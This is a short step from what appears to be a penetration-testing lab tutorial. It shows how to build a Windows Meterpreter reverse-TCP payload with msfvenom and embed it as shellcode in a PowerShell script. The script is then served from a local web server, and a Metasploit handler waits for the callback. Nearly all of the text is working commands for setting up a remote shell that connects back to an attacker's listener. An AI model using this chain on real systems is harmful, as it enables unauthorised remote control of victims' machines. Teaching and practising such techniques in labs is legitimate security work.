# Step 2: Payload (Kali)
We will need to alter the payload so that we can specify our Kali server, this the the code starting with:
```powershell
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4....
```

Run the following command to create the new buffer:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.2.10.254 LPORT=443 EXITFUNC=thread -f powershell
```

Now copy the output and replace it with the code in the script (run.txt).
##### **NOTE:** Make sure you have the starting bracket square , else the script will not run!!!
```
**[**Byte[]] $b
```

In the directory where you have run.txt, start a local webserver on port 8080
```python
python3 -m http.server 8080
```

Now lets start the listener on Metasploit:
```cmd
sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set EXITFUNC thread; set LPORT 443; set LHOST eth1; set ExitOnSession false; run -j -z"
```

use exploit/multi/handler => Exploit to use
windows/x64/meterpreter/reverse_tcp => The payload (That mathches the one we generated earlier)
set EXITFUNC => Set this ti thread
set LPORT => The port to listen on
set LHOST => The interface or IP to listen on
run -j -z => Run in the background
